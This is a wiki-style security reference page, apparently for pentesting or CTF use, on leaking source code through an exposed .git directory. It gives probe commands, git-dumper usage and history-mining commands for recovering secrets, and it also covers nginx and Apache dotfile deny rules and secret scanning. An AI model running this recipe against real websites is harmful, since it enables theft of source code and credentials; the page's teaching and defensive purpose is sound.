---
title: Git source leakage
slug: git-source-leakage
---

> **TL;DR:** An exposed `.git/` directory under the web root lets attackers reconstruct full source history, harvest secrets from old commits, and read removed flags or credentials that the developer thought were gone.

## What it is
When a repository is deployed by `git clone` or `git pull` straight into the document root without excluding `.git/`, every object, pack, and ref becomes fetchable over HTTP. Even when directory listing is off, the layout is deterministic (`HEAD`, `config`, `objects/<sha-prefix>/<rest>`, `packed-refs`, `logs/HEAD`) so a dumper can walk it blindly. The result is the same as receiving the repository — including commits that "deleted" secrets, since git history is append-only.

## Preconditions / where it applies
- Web root contains `.git/` and the server does not block dotfiles
- Static hosts, shared hosting, hastily-deployed Docker images, CI artefacts copied with `COPY . .`
- Any service where `curl https://target/.git/HEAD` returns `ref: refs/heads/...`

## Technique
Confirm the leak, then dump and inspect history.

```bash
# 1. Probe
curl -sI https://target/.git/HEAD
curl -s  https://target/.git/config

# 2. Dump with one of the standard tools
git-dumper https://target/.git/ ./loot
# alternatives: GitTools/Dumper, gitdumper.sh, goop
python3 -m pip install git-dumper

# 3. Walk history for secrets and removed flags
cd loot
git log --all --stat
git log -p -- config.php .env secrets.yml
git reflog --all                       # commits unreachable from HEAD
git fsck --unreachable --no-reflogs    # dangling blobs
git show <sha>:path/to/flag.txt        # read a file at any revision
```

A common pattern: a developer commits a flag or API key, notices, runs `git reset --hard HEAD^` and re-pushes — but the blob still lives in `.git/objects/` and `reflog` until GC. `git log --all --diff-filter=D` finds deletions; `trufflehog git file://./loot` finds high-entropy strings across every revision.

## Detection and defence
- Block dotfiles at the front-end: `location ~ /\. { deny all; }` (nginx) or `<FilesMatch "^\.">Require all denied</FilesMatch>` (Apache)
- Deploy with `rsync --exclude=.git` or build artefacts, never `git pull` in webroot
- CI secret scanning (`gitleaks`, `trufflehog`) on every push; rotate any secret that ever touched git
- Honeytoken commits to catch dumpers in WAF logs (lots of sequential `/.git/objects/<2>/<38>` requests)

## References
- [internetwache/GitTools](https://github.com/internetwache/GitTools) — original Dumper / Extractor reference
- [git-dumper](https://github.com/arthaud/git-dumper) — modern Python dumper
- [HackTricks – Git exposed](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/git.html) — checklist and edge cases

See also: [[information-disclosure]], [[backup-and-config-leakage]], [[banner-and-fingerprinting]].
